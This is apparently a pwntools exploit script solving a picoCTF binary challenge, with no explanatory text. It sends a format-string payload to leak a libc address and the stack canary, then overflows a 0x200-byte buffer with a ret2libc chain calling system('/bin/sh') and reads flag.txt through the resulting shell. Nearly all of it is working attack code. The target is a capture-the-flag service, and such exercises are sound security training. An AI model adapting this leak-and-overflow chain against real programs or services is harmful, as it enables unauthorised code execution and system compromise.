#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        	b* 0x080487CE
        	b* 0x080487FE
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("jupiter.challenges.picoctf.org", 13775)

rand_num = -3727
# Brute force random number
# for i in range(-3800, 4096):
# 	# print("Trying " + str(i))
# 	p.sendlineafter(b'What number would you like to guess?\n', str(i))
# 	output = p.recvline()

# 	if b'Congrats' in output:
# 		rand_num = i
# 		print("Byte found: " + str(i))
# 		break

# remote
p.sendlineafter(b'What number would you like to guess?\n', str(rand_num).encode())

rw_section = 0x804a800
payload = flat(
	b'%2$p'.ljust(8, b'a'),
	b'%135$p',
	)
p.sendlineafter(b'Name? ', payload)

# Leak libc
p.recvuntil(b'Congrats: ')
libc_leak = int(p.recvuntil(b'aaaa', drop=True), 16)
print("Libc leak: " + hex(libc_leak))
libc_base = libc_leak - 0x22a620
print("Libc base: " + hex(libc_base))

# Leak canary
canary = int(p.recvuntil(b'\n', drop=True), 16)
print("Canary: " + hex(canary))

p.sendlineafter(b'What number would you like to guess?\n', str(rand_num).encode())

payload = flat(
	b'a'*0x200,
	canary,
	b'a'*8,
	rw_section,
	exe.sym.win + 3
	)
p.sendlineafter(b'Name? ', payload)

system_offset = 0x48170
binsh_offset = 0x1bd0d5
payload = flat(
	b'a'*0x200,
	canary,
	b'a'*12,
	libc_base + system_offset,
	libc_base + binsh_offset,
	libc_base + binsh_offset,
	)
# GDB()
p.sendlineafter(b'Name? ', payload)
p.sendline(b'cat flag.txt')

p.interactive()